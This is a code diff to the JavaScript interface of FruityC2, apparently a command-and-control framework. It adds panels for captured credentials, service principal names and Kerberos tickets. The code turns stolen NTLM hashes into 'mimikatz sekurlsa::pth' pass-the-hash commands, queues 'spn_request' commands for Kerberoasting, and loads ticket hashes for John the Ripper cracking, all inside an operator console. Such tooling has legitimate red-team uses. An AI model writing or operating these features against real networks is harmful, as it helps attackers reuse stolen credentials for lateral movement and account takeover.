@@ -139,7 +139,11 @@ function load_credentials() {
             content += "<tr>";
             content += "<td style='padding-right: 10px;'><i class='fa fa-close' style='font-size:12px' onclick='credentials_del(\""+key+"\")'></i> </td>";
             content += "<td style='padding-right: 10px;' nowrap>"+value.user+"</td>";
-            content += "<td style='padding-right: 10px;'>"+value.pass+"</td>";
+            if (value.type == "hash") {
+                content += "<td style='padding-right: 10px;'><a href='#' onclick='mimikatz_pth(\""+value.user+"\",\""+value.domain+"\",\""+value.pass+"\")'>"+value.pass+"</a></td>";
+            } else {
+                content += "<td style='padding-right: 10px;'>"+value.pass+"</td>";
+            }
             content += "<td style='padding-right: 10px;'>"+value.domain+"</td>";
             content += "<td style='padding-right: 10px;'>"+value.source+"</td>";
             content += "<td style='padding-right: 10px;' nowrap>"+value.host+"</td>";
@@ -160,6 +164,90 @@ function credentials_del(id) {
 	} else {
 		return false;
 	}
+}
+
+function mimikatz_pth(user, domain, pass) {
+    if (domain === "") { domain = "." ; }
+    command = "mimikatz sekurlsa::pth /user:"+user+" /domain:"+domain+" /ntlm:"+pass;
+    $("#control").val(command);
+    modal_close("mCredentials");
+    $("#control").focus();
+    //alert(command);
+}
+
+function load_credentials_spn() {
+    container_id = "container_credentials_spn";
+    $("#"+container_id).empty();
+    
+	content = "<table>";
+	content += "<tr>";
+	content += "<td></td>";
+    content += "<td style='font-weight: bold; padding-right: 10px;'>sAMAccountName</td>";
+    content += "<td style='font-weight: bold; padding-right: 20px;'>ServicePrincipalName</td>";
+    //content += "<td style='font-weight: bold; padding-right: 20px;'>Host</td>";
+	content += "</tr>";
+	
+	//$("#"+container_id).append(content)
+	
+	$.getJSON(FruityC2+"/credentials/spn", function(obj) {
+        $.each(obj, function(key, value) {			
+			
+            content += "<tr>";
+            content += "<td style='padding-right: 10px;'><i class='fa fa-close' style='font-size:12px' onclick='credentials_spn_del(\""+key+"\")'></i> </td>";
+            content += "<td style='padding-right: 20px;'>"+value.samaccountname+"</td>";
+            content += "<td style='padding-right: 20px;'><a href='#' onclick='spn_request(\""+value.serviceprincipalname+"\")'>"+value.serviceprincipalname+"</a></td>";
+            //content += "<td style='padding-right: 20px;' nowrap>"+value.host+"</td>";
+            content += "</tr>";
+			
+			//$("#"+container_id).append(content)
+        });
+        content += "</table>";
+        $("#"+container_id).append(content);
+    });   
+}
+
+function spn_request(serviceprincipalname) {
+    command = "spn_request "+serviceprincipalname;
+    $("#control").val(command);
+    modal_close("mCredentials");
+    $("#control").focus();
+}
+
+function load_credentials_ticket() {
+    container_id = "container_credentials_ticket";
+    $("#"+container_id).empty();
+    
+	content = "<table>";
+	content += "<tr>";
+	content += "<td></td>";
+    content += "<td style='font-weight: bold; padding-right: 10px;'>Host</td>";
+    content += "<td style='font-weight: bold; padding-right: 10px;'>Server Name</td>";
+    //content += "<td style='font-weight: bold; padding-right: 20px;'>serviceprincipalname</td>";
+    //content += "<td style='font-weight: bold; padding-right: 20px;'>Host</td>";
+	content += "</tr>";
+	
+	//$("#"+container_id).append(content)
+	
+	$.getJSON(FruityC2+"/credentials/ticket", function(obj) {
+        $.each(obj, function(key, value) {			
+			
+            content += "<tr>";
+            content += "<td style='padding-right: 10px;'><i class='fa fa-close' style='font-size:12px' onclick='credentials_ticket_del(\""+key+"\")'></i> </td>";
+            content += "<td style='padding-right: 20px;'>"+value.host+"</td>";
+            content += "<td style='padding-right: 20px;'><a href='#' data-toggle='modal' data-target='#mCredentialsJohn' onclick='get_john(\""+value.john+"\")'>"+value.servername+"</a></td>";
+            //content += "<td style='padding-right: 20px;'><a href='#' onclick='spn_request(\""+value.serviceprincipalname+"\")'>"+value.serviceprincipalname+"</a></td>";
+            //content += "<td style='padding-right: 20px;' nowrap>"+value.host+"</td>";
+            content += "</tr>";
+			
+			//$("#"+container_id).append(content)
+        });
+        content += "</table>";
+        $("#"+container_id).append(content);
+    });   
+}
+
+function get_john(value) {
+    $("#credentials_john").val(value);
 }
 
 /*
